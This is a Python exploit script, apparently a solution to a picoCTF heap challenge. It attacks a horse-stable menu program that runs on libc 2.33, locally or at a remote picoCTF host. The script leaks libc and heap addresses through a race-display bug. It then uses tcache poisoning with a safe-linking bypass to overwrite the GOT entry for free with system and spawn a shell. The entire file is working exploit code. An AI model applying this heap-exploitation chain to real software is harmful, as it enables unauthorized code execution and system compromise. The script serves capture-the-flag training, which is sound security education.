#!/usr/bin/env python
import ptrlib as ptr
import sys

elf = ptr.ELF("./vuln_patched")
libc = ptr.ELF("./libc-2.33.so")

ptr.logger.setLevel("DEBUG")
remote = False


def connect():
    global remote
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        remote = True
        return ptr.Socket("saturn.picoctf.net", 56031)
    else:
        return ptr.Process(elf.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def cheat(io, index, name, new_pos):
    ptr.logger.debug(f"cheating {index} {name}")
    io.sendlineafter(b"Choice: ", b"0")
    ptr.logger.debug(f"Choice: {0}")
    io.sendlineafter(b"Stable index # (0-17)? ", str(index).encode())
    ptr.logger.debug(f"Stable index # (0-17)?  {index}")
    io.sendlineafter(b"Enter a string of 16 characters: ", name)
    ptr.logger.debug(f"Enter a string of 16 characters: {name}")
    io.sendlineafter(b"New spot? ", str(new_pos).encode())
    ptr.logger.debug(f"New spot? {new_pos}")
    ptr.logger.debug("finished cheating")


def add(io, index, length, name):
    ptr.logger.debug(f"adding {index} {length} {name}")
    io.sendlineafter(b"Choice: ", b"1")
    ptr.logger.debug(f"Choice: {1}")
    io.sendlineafter(b"Stable index # (0-17)? ", str(index).encode())
    ptr.logger.debug(f"Stable index # (0-17)?  {index}")
    io.sendlineafter(b"Horse name length (16-256)? ", str(length).encode())
    ptr.logger.debug(f"Horse name length (16-256)? {length}")
    io.sendlineafter(f"Enter a string of {length} characters: ".encode(), name)
    ptr.logger.debug(f"Enter a string of {length} characters: {name}")
    ptr.logger.debug("finished adding")


def remove(io, index):
    ptr.logger.debug(f"removing {index}")
    io.sendlineafter(b"Choice: ", b"2")
    ptr.logger.debug(f"Choice: {2}")
    io.sendlineafter(b"Stable index # (0-17)? ", str(index).encode())
    ptr.logger.debug(f"Stable index # (0-17)?  {index}")
    ptr.logger.debug("finished removing")


def race2leak(io, num) -> list[bytes]:
    global remote
    ptr.logger.debug("racing")
    io.sendlineafter(b"Choice: ", b"3")
    ptr.logger.debug(f"Choice: {3}")
    ptr.logger.debug("waiting for end of race")
    data = []
    try:
        for i in range(num):
            d = io.recvline().strip(b"|\n").replace(b" ", b"")
            print(i, hex(ptr.u64(d)))
            data.append(d)

        io.recvuntil(b"WINNER: ")
    except TimeoutError:
        ptr.logger.error("timeout")
        io.sh()
    ptr.logger.debug("finished racing")
    if remote:
        print(data)
        return [data[8], data[7]]
    else:
        return [data[7], data[8]]


def main():
    io = connect()

    #
    # leak libc and heap
    #

    for i in range(9):
        add(io, i, 0x100, b"\xff")

    add(io, 9, 0x10, b"p" * 0x10)

    for i in range(8, -1, -1):
        remove(io, i)

    for i in range(9):
        add(io, i, 0x100, b"\xff")

    leaks = race2leak(io, 9)
    libc.base = ptr.u64(leaks[0]) - 0x1E0E10
    heap_base = (ptr.u64(leaks[1]) ^ 0) << 12

    ptr.logger.info(f"libc: {hex(libc.base)}")
    ptr.logger.info(f"heap: {hex(heap_base)}")

    #
    # tcache poisoning to GOT overwrite
    #

    one_gadgets = [0xDE78C, 0xDE78F, 0xDE792]
    add(io, 10, 0x28, b"\xff")
    add(io, 11, 0x28, b"\xff")
    add(io, 12, 0x18, b"p" * 0x18)
    remove(io, 11)
    remove(io, 10)
    # target = heap_base + 0x2A0
    # payload = ptr.p64(target ^ (heap_base + 0xF60) >> 12)
    # payload += b"\xff"
    # cheat(io, 10, payload, 1)
    #
    # add(io, 13, 0x28, b"\xff")
    # add(io, 14, 0x28, ptr.p64(unwrap(elf.got("free"))) + b"\xff")
    # add(io, 15, 0x18, b"/bin/sh\x00\xff")
    # cheat(io, 0, ptr.p64(unwrap(libc.symbol("system"))) + b"\xff", 0)
    # remove(io, 15)
    payload = ptr.p64((unwrap(elf.got("free")) - 8) ^ (heap_base) >> 12) + b"\xff"
    cheat(io, 10, payload, 0)

    add(io, 13, 0x28, b"/bin/sh\x00\xff")
    add(
        io,
        14,
        0x28,
        ptr.p64(0xDEADBEEF)
        + ptr.p64(unwrap(libc.symbol("system")))
        + ptr.p64(unwrap(libc.symbol("puts")))
        + ptr.p64(unwrap(libc.symbol("fread")))
        + b"\xff",
    )
    remove(io, 13)

    io.sh()


if __name__ == "__main__":
    main()
